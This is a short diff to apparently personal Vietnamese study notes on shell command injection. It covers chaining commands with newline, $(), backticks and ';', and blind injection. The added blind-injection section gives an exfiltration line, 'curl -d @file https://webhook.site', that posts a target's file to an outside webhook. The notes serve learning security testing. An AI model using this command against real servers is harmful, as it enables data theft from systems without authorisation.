@@ -12,4 +12,10 @@
 #### https://www.gnu.org/software/bash/manual/html_node/Command-Substitution.html 
 #### 4 tài liệu linux shell
 ### đặt biệt trong các tham số get,post là bị hiểu nhầm là đang truyền tham số đó chứ k phải là taget (&& là và trong linux)
-### https://www.asciitable.com/ dùng new line (%0a) hoặc có thể nồng bằng cách $() hoặc `` 
+### https://www.asciitable.com/ dùng new line (%0a) hoặc có thể nồng bằng cách $() hoặc ``  hoặc có thể dùng ; để ngắt câu lệnh và bắt đầu 1 câu lệnh mới 
+# Blind-Command Injection 
+#### dùng webhook 
+#### xác định xem là website có sử dụng được lệnh curl hay k sau đó dùng %23(url encode là # dùng để comment ) để xóa hết phần phía sau đi 
+#### sau đó dùng curl (hoặc wget) để gọi ra bên ngoài 
+#### để dọi được file ra bên ngoài dùng curl -d @duong_dan_file https://webhook.site
+ 
